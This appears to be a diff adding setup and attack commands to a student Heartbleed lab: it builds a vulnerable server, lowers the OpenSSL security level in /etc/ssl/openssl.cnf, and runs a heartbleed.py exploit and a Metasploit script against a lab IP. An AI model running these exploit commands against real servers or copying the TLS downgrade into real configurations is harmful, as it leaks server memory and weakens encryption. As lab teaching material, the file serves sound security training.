@@ -74,6 +74,14 @@ jobs:
 # sudo chmod +x ./bash/heartbleed-vulnerable-server.sh && sudo ./bash/heartbleed-vulnerable-server.sh
 
 
+##### injection server -- simulate client request
+
+# sudo apt-get update -y && sudo apt-get install -y git python && git clone https://github.com/amineAUPEC/heartbleed-automation.git && cd heartbleed-automation/
+# cd /home/etudiant && git clone https://github.com/injcristianrojas/heartbleed-example.git
+# sudo sed -E -i 's/CipherString = DEFAULT@SECLEVEL=2/CipherString = DEFAULT@SECLEVEL=1/' /etc/ssl/openssl.cnf
+# cd /home/etudiant/heartbleed-example && python stimulate_server.py -a $ip 
+
+
 
 ##### pentest server
 # sudo chmod +x ./bash/heartbleed-vulnerable-pentest.sh
@@ -81,3 +89,51 @@ jobs:
 # nano ./conffiles/hostlist.txt && nano ./bash/heartbleed-vulnerable-pentest.sh
 # execute file
 # sudo ./bash/heartbleed-vulnerable-pentest.sh
+
+
+##### exploit via metapsloit
+sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git 
+cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit.sh && sudo ./metasploit.sh
+
+
+
+
+
+
+
+
+
+
+# ========================================================================================================================================
+# if manually installed
+##### on all server
+sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git && cd heartbleed-automation/
+
+##### vulnerable server part :
+sudo chmod +x ./bash/heartbleed-vulnerable-server.sh && sudo ./bash/heartbleed-vulnerable-server.sh
+
+
+
+##### injection server -- simulate client request
+
+sudo apt-get update -y && sudo apt-get install -y git python && git clone https://github.com/amineAUPEC/heartbleed-automation.git && cd heartbleed-automation/
+cd /home/etudiant && git clone https://github.com/injcristianrojas/heartbleed-example.git
+sudo sed -E -i 's/CipherString = DEFAULT@SECLEVEL=2/CipherString = DEFAULT@SECLEVEL=1/' /etc/ssl/openssl.cnf
+cd /home/etudiant/heartbleed-example && python stimulate_server.py -a $ip 
+
+
+
+##### pentest server
+cd heartbleed-automation/ && sudo chmod +x ./bash/heartbleed-vulnerable-pentest.sh
+#### set IP
+nano ./conffiles/hostlist.txt && nano ./bash/heartbleed-vulnerable-pentest.sh
+# execute file
+sudo ./bash/heartbleed-vulnerable-pentest.sh
+
+watch sudo python heartbleed.py 192.168.1.173 -p 443
+
+
+
+##### exploit via metapsloit
+sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git 
+cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit.sh && sudo ./metasploit.sh
